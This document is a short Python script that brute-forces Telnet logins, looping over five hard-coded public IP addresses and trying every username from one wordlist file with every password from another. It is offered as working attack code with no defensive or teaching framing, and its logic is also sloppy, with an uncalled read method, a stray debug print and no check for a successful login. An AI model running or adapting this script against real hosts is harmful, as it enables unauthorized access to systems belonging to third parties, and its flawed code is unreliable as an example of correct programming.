import telnetlib
ip = ("149.0.222.170", "149.5.37.53", "149.5.38.121", "149.6.39.227", "149.6.162.202")

for i in ip:
    with open('users.txt') as f:
        for username in f:
            striped_username = username.strip()
            with open('contra.txt') as c:
                for contrasenya in c:
                    striped_contra= contrasenya.strip()
                    tn = telnetlib.Telnet(i)
                    print(tn.read_all)
                    tn.read_until(b"login: ")
                    tn.write(striped_username.encode('ascii') + b"\n")
                    print("hola")
                    tn.read_until(b"Password: ")
                    tn.write(striped_contra.encode('ascii') + b"\n")
                    print(i, striped_username, striped_contra)


                    